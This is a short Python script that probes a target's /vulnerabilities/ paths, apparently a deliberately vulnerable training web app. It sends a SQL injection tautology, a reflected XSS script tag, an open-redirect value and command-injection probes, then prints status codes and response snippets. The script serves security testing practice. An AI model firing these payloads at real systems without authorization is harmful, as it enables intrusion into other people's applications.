#!/usr/bin/env python3
# tools/probe_candidates.py
import argparse, requests, json, sys
from urllib.parse import urljoin

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True)
args = parser.parse_args()
target = args.target.rstrip("/")

candidates = [
    ("/vulnerabilities/sqli/", "id", "1"),
    ("/vulnerabilities/sqli/", "id", "1' OR '1'='1"),
    ("/vulnerabilities/xss_r/", "name", "<script>alert(1)</script>"),
    ("/vulnerabilities/redirect/", "url", "http://example.com/"),
    ("/vulnerabilities/exec/", "cmd", "id"),
    ("/vulnerabilities/exec/", "cmd", "whoami"),
]

session = requests.Session()
session.headers.update({"User-Agent":"RedMind-Checker/1.0"})

print("Probing candidate paths:\n")
for path, param, value in candidates:
    url = urljoin(target, path)
    params = {param: value}
    try:
        r = session.get(url, params=params, timeout=10, allow_redirects=True)
        text = r.text or ""
        snippet = text[:400].replace("\n"," ").replace("\r"," ")
        print(f"PATH: {path}  PARAM: {param}  STATUS: {r.status_code}  LEN: {len(text)}")
        print(f"  snippet: {snippet[:300]}\n")
    except Exception as e:
        print(f"PATH: {path} PARAM: {param} ERROR: {e}\n")

print("\nDone. If responses differ between benign and payload versions, note that path+param is promising.")
